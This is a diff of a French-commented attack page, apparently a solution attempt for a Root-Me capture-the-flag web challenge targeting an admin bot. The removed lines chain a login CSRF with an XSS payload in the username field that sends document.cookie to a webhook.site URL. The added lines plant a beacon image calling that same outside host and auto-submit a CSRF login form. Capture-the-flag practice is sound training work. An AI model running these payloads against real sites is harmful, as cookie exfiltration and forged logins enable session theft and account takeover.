@@ -1,19 +1,12 @@
+ <form id="f" method="POST" action="http://challenge01.root-me.org:58003/login">
+  <input name="username" value="VOTRE_USERNAME_XSS">
+  <input name="secret" value="x">
+</form>
 <script>
-// La fenêtre principale NE navigue PAS
-// 1. Ouvre le profil admin dans un onglet nommé
-window.open('http://challenge01.root-me.org:58003/profile', 'adminpf');
+// Diagnostic: le bot a-t-il un opener ?
+new Image().src='http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba?step=visit&opener='+(window.opener?'yes':'no');
 
-setTimeout(function() {
-  // 2. CSRF login dans UN AUTRE onglet nommé 'loginwin'
-  var f = document.createElement('form');
-  f.method = 'POST';
-  f.action = 'http://challenge01.root-me.org:58003/login';
-  f.target = 'loginwin';
-  f.innerHTML = '<input name="username" value="document.location=`http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba/?c=${document.cookie}`"><input name="secret" value="x">';
-  document.body.appendChild(f);
-  window.open('about:blank', 'loginwin');
-  f.submit();
-  // loginwin → login → redirect /profile → XSS tire
-  // XSS lit adminpf (même domaine) → secret admin
-}, 3000);
+// CSRF login — navigue CET onglet vers challenge.com
+// window.opener est préservé après navigation
+document.getElementById('f').submit();
 </script>
